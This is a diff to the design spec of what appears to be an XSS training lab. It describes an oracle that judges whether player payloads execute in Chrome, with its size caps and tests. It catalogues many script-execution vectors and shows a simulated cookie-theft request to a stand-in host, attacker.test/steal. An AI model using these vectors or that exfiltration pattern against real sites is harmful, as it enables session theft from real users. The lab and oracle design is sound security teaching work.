@@ -1241,8 +1241,9 @@ four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.
    `xssOracle(body, marker)` first, before the browser sees the answer, which is unchanged. A rendered page is any
    answer except a followed redirect, of a type a browser renders as a document, and not a download. When the payload
    runs, exactly one request lands in the player's attacker log: `GET http://attacker.test/steal?c=<canary>`, with no
-   Referer. The canary is read once the browser has stored that page's own `Set-Cookie`: at the visit's next request,
-   or when the visit ends. A `Refresh` hop straight to attacker.test is logged before it.
+   Referer. The canary is read once the browser has stored that page's own `Set-Cookie`, and before the next page
+   answers: at the visit's next request (before its handler runs), or when the visit ends. So a later page that
+   rotates the session does not change what was stolen. A `Refresh` hop straight to attacker.test is logged before it.
 3. **Render the preview.** The view shows the marker (escaped), the player's input (escaped, in the lab chrome) and
    one raw value, the preview: `preview = previewFrame(level.results(q), { marker: state.marker.call, title })`, output
    with `<%- preview %>`. Never output the raw fragment anywhere else on the page.
@@ -1264,25 +1265,29 @@ four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.
   attribute values, URLs), where the oracle is exact.
 - **A level whose only fix is a CSP is not a Divine.** Only CSP `sandbox` is modelled; other directives are not
   evaluated. Divine encodes or sanitizes correctly, and a CSP is defence in depth.
+- **A level that serves player XML refuses any DOCTYPE with an internal subset, at least at Divine** (plan amendment
+  after the E0 re-review). The oracle refuses a DTD that declares entities or attribute defaults (`limited: 'dtd'`,
+  under "Served markup" below), so no intended solve may depend on a DTD, and the lab's spec asserts that Divine never
+  produces `limited: 'dtd'`.
 
 ### What the oracle counts
 
-`xssOracle(html, marker, { insertion?, interact?, sandbox?, syntax? })` answers
-`{ executes, sinks, reachedMarker, mxss, limited?, wellFormed? }`. `executes` is true when a sink whose code contains
-the marker call would run in the page's origin. Every row below was checked in headless Chrome 157: about 340 cases in
-both insertion modes, plus XML documents. The only rows that differ are ones a harness cannot drive (opening a
-`<details>` that has no `<summary>`).
+`xssOracle(html, marker, { insertion?, interact?, sandbox?, syntax? })` answers `{ executes, sinks, reachedMarker,
+mxss, limited?, wellFormed? }`. `executes` is true when a sink whose code contains the marker call would run in the
+page's origin. Every row below was checked in headless Chrome 157: about 380 cases in both insertion modes, plus XML
+documents and `data:` images. The only rows that differ are ones a harness cannot drive (opening a `<details>` that
+has no `<summary>`).
 
 | Sink row | Runs (examples) | Does not run (examples) |
 |---|---|---|
 | element (`script`) | `<script>`, `type=module`, a JS MIME type, `src="data:,..."` (a classic script runs whatever the data type) | `type=text/plain`, a type with parameters, `nomodule`, `src=http://...` (its code is not on the page), entities inside an HTML script |
-| attribute (`event-handler`), on load | `onerror` on a source that fails (`src=x`, a broken `data:` image); `onload` on a `data:` source that decodes, a frame, a style, an `<svg>`, the body; a stylesheet, a preload with `as`, a modulepreload or a prefetch link; a default `<track>`; `autofocus` + `onfocus`; `details open` + `ontoggle`; SMIL `onbegin`/`onend`; CSS animation events with an inline animation and a `@keyframes` rule; `content-visibility: auto` | unknown names (`onfoo`), `data-onload`; `onerror` on a `data:` image that decodes, on an icon link, a bare preload, an embed, an iframe or a text input; a `<track>` without `default`; `onload` on SVG children (`g`, `rect`); window events on anything but `body` |
+| attribute (`event-handler`), on load | `onerror` on a source that fails (`src=x`, a broken `data:` image); `onload` on a `data:` source that decodes, a frame, a style, an `<svg>`, the body; a stylesheet, a preload with `as`, a modulepreload or a prefetch link; a default `<track>` of a `<video>` or `<audio>`; `autofocus` + `onfocus`; `details open` + `ontoggle`; SMIL `onbegin`/`onend`; CSS animation events with an inline animation and a `@keyframes` rule; `content-visibility: auto` | unknown names (`onfoo`), `data-onload`; `onerror` on a `data:` image that decodes, on an icon link, a bare preload, an embed, an iframe or a text input; a `<track>` without `default` or outside a media element; `onload` on SVG children (`g`, `rect`); window events on anything but `body` |
 | attribute, on interaction | `onmouseover`, `onclick`; `onfocus` on an element that can take focus; transition events | `onfocus` on one that cannot |
-| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`, on `formaction` of a submit button with a form (interaction), on `iframe src` (load); SMIL `href` animation of an SVG link (`<animate attributeName=href values="javascript:...">`, on click); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object`/`embed`, `math href`, `meta refresh`, `base`, top-level `data:` links; `formaction` on `type=button`/`reset`, a text input, or with no form; `attributeName=xlink:href`; a `data:` frame runs, but `isolated` |
+| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`, on `formaction` of a submit button with a form owner (interaction; see below), on `iframe src` (load); SMIL `href` animation of an SVG link (`<animate attributeName=href values="javascript:...">`, on click); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object`/`embed`, `math href`, `meta refresh`, `base`, top-level `data:` links; `formaction` on `type=button`/`reset`, a text input, or with no form owner; `attributeName=xlink:href`; a `data:` frame runs, but `isolated` |
 | `srcdoc` | the framed document's own sinks, in the page's origin | a `sandbox` without `allow-scripts`; with `allow-scripts` alone the sinks are `isolated` |
 | SVG (`svg-script`) | `<svg><script>` (entities decoded), `foreignObject` and MathML `mtext` switching back to HTML | scripts inserted by innerHTML |
 | declarative shadow DOM | a page's `<template shadowrootmode=open\|closed>` (any case) on a host that can take one (HTML's valid shadow hosts, a custom element, the body), the first per host: its content is live | innerHTML; an `<a>` host; a second template; any other mode; template content otherwise (inert) |
-| customizable `<select>` | markup inside a select (Chrome 135+ keeps it; parse5 8.0.1 drops it): a second pass reads the page with select renamed, and its sinks count | text and attributes that only mention `<select` |
+| customizable `<select>` | markup inside a select (Chrome 135+ keeps it; parse5 8.0.1 drops it): a second pass reads the page with select renamed, and every framed document it holds once decoded (a select in an entity-encoded `srcdoc`), and its sinks count | text and attributes that only mention `<select` |
 | style | none: CSS is never script; `<svg><style><img onerror>` runs only because the img breaks out of foreign content | `<style>`, `style=url(javascript:...)`, `@import 'javascript:'` |
 
 - **The marker** must appear literally in the sink's code, in any quote style, with spaces, or as a method call
@@ -1291,6 +1296,21 @@ both insertion modes, plus XML documents. The only rows that differ are ones a h
   Another player's marker, or another level's, never counts.
 - **`reachedMarker`** with `executes: false` means the payload reached the page as text: escaped, in a comment, or
   in an attribute. A lab may say so in a note.
+- **Form owners (`formaction`).** A submit button's `formaction` navigates only when the button has a form owner, as
+  the HTML parser leaves it. With a `form=` attribute, the owner is the first element with that id, and it must be a
+  form: `form=""`, an unknown id or a non-form id means no owner, even inside a form. Without one, an ancestor form
+  owns it. Failing that, in a page the parser read (`insertion: 'document'`), the parser's form element pointer does:
+  the last `<form>` start tag before the button with no `</form` between them, so
+  `<div><form></div><button formaction=javascript:...>` runs. innerHTML keeps no such pointer. Ids inside template
+  content do not count.
+- **`data:` images** are checked by structure, not decoded. A GIF needs one complete image (its trailer may be
+  missing). A PNG needs IHDR first and one complete IDAT (IEND may be missing). A JPEG needs a frame header with a
+  non-zero size and the start of a scan (EOI may be missing). A WebP needs its RIFF size and a VP8, VP8L or VP8X chunk.
+  Garbage behind a valid signature errors, but the compressed pixels are never decoded: a well-formed file with
+  corrupt pixel data counts as loading, so no lab should depend on one. An SVG image must be a well-formed XML
+  document with an SVG-namespace `<svg>` root. An SVG that is over 16 KiB or 1024 tag openers, over the XML reader's
+  caps, or that has a refused DTD is **not judged**: neither its `onload` nor its `onerror` counts. Each `data:`
+  source is judged once per oracle call.
 - **`interact`** defaults to true: the admin reads the page and hovers and clicks it. Pass `false` for a victim who
   only loads the page.
 
@@ -1324,8 +1344,17 @@ both insertion modes, plus XML documents. The only rows that differ are ones a h
   `core/xss/xml.ts`), as Chrome 157 reads them. Namespaces decide what an element is: an `<svg>` without `xmlns` is
   not SVG, and an `<img>` inside SVG is no image. Names are case-sensitive. A not-well-formed document runs only what
   was read before the error: a script whose end tag was read runs, but the root `<svg>`'s `onload` needs the whole
-  document well-formed. The verdict says `wellFormed`. A DTD's entities are not expanded (a reference to one stops
-  the read). A `Content-Security-Policy: sandbox` applies; other CSP directives are not evaluated. Per the SC-05
+  document well-formed. The verdict says `wellFormed`. The reader keeps Chrome's errors. A name stops at the first
+  character that is not an XML name character, so `<!DOCTYPE svg[` stops the read, while `<!DOCTYPE svg [` does
+  not. A malformed `<?xml ...?>` declaration stops it too (version first, then encoding, then standalone).
+  `xmlns:xml` may only bind the XML namespace, and character references may carry any number of leading zeros.
+  **DTDs:** a DOCTYPE whose internal subset contains `<!ENTITY` or `<!ATTLIST` is refused whole
+  (`executes: false, limited: 'dtd'`). Chrome expands those entities and applies ATTLIST defaults, so a declared
+  `onload` default on `<svg>` runs too, and a static reader can expand neither. Any other subset (`<!ELEMENT>`,
+  comments) is read past, and a reference to an undeclared entity stops the read. Hence the rule above: a level that
+  serves player XML refuses a DOCTYPE with an internal subset, at least at Divine. (The XXE labs teach DTDs on the
+  server's own parser, and never send the player's DTD through the oracle.) A `Content-Security-Policy: sandbox`
+  applies; other CSP directives are not evaluated. Per the SC-05
   amendment, the citadel serves the sigil inline inside an HTML page, the real route always sends an inert download,
   and the payload fires only in the preview.
 - **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
@@ -1344,7 +1373,11 @@ is bounded:
 - **While parse5 builds the tree:** a tree adapter counts every element it creates, rebuilt copies included. The caps
   are 4096 elements (`elements`) and 128 K characters of attribute text (`attributeText`).
 - **Refusals:** a page over any of these is refused whole and deterministically, `executes: false, limited:
-  'size' | 'tags' | 'nodes'`. A framed document over them is skipped (`'nodes'`, `'srcdoc'` past 2 frames deep).
+  'size' | 'tags' | 'nodes'` (and `'dtd'` for an XML document, above). A framed document over them is skipped
+  (`'nodes'`, `'srcdoc'` past 2 frames deep).
+- **XML documents and `data:` SVG images** go through the XML reader under the same 16 KiB, 1024-tag and tree caps.
+  An image over them is not judged, and each image is read once per call. An element copies its namespace scope only
+  when it declares a namespace.
 - **The mXSS round trip** runs only on trees at most 512 deep (parse5 serializes recursively). Its exact serialized
   length is computed before it is built. One parse budget covers the page, its frames, the select pass and the round
   trips (`'budget'`).
@@ -1357,12 +1390,15 @@ is bounded:
 
 Keep citadel pages under 16 KiB: cap stored items, and per the amendment keep an SVG sigil at about 12 KiB.
 
-Measured at the caps (Node 22.22, parse5 8.0.1, warm):
+Measured at the caps (Node 22.22, parse5 8.0.1, warm), over the re-review's 45 worst-case inputs:
 - The worst input is one tag with 16 KiB of distinct attributes, because parse5's own duplicate-attribute check is
-  quadratic. It is read up to three times (the page, the select pass, the round trip) and costs about 60 to 70 ms, or
-  80 to 100 ms cold.
-- The review's inputs are refused early: an unclosed link with a 13 K href copied into 400 blocks in 0.4 ms, and 400
-  formatting elements rebuilt in 300 blocks in 3.3 ms.
+  quadratic. Behind a `<select>` and a `<noscript>`, it is read by every pass the parse budget allows (the page, the
+  select pass, a round trip) and costs about 70 ms, or 90 ms cold. Every input outside that family costs under 25 ms warm (35 ms cold).
+- XML costs little: a document with 900 `xmlns:` prefixes and 1020 elements takes about 2 ms. A `data:` SVG image
+  with hundreds of prefixes, behind a select and a noscript, takes 2.5 to 4.5 ms (8 ms cold); it took up to 555 ms
+  before namespace scopes were copied only on write and each image was read only once.
+- The first review's inputs are refused early: an unclosed link with a 13 K href copied into 400 blocks in 0.4 ms, and
+  400 formatting elements rebuilt in 300 blocks in 3.3 ms.
 - A realistic 5 KB lab page takes about 1.5 ms.
 
 A victim action blocks for that long at most: a self-DoS in a single-player loopback lab, like the SQL residual in
@@ -1390,7 +1426,8 @@ Every string kept is a copy.
 ### Testing
 
 - **The guard (`tests/xss.spec.ts`).** It holds the sink matrix, the Chrome 157 rows (declarative shadow DOM, the
-  select pass, SMIL `href`, precision, XML documents), escaped negatives, mXSS corpora, marker reachability,
+  select pass, SMIL `href`, precision, form owners, `data:` images and tracks, XML documents and DTDs), escaped
+  negatives, mXSS corpora, marker reachability,
   per-player isolation, the bounds (including the linear-time and mocked-clock cases), `linkSinks` and the preview's
   attributes. It also guards imports: `core/xss/` imports
   only parse5 and `sim/limits.ts` (the copying clip), with no dynamic `import()`, no network, file system, `vm`,
@@ -1408,4 +1445,6 @@ Every string kept is a copy.
     page);
   - Divine's librarian saw the marker as text (`labFor(...).admin.verdicts`: `reachedMarker` true, `fired` false);
   - players and levels are isolated;
-  - a logout link does not wedge the victim (re-arm).
+  - a logout link does not wedge the victim (re-arm);
+  - for a level that serves player XML: Divine never produces `limited: 'dtd'` (it refuses a DOCTYPE with an
+    internal subset before the admin's browser sees it).
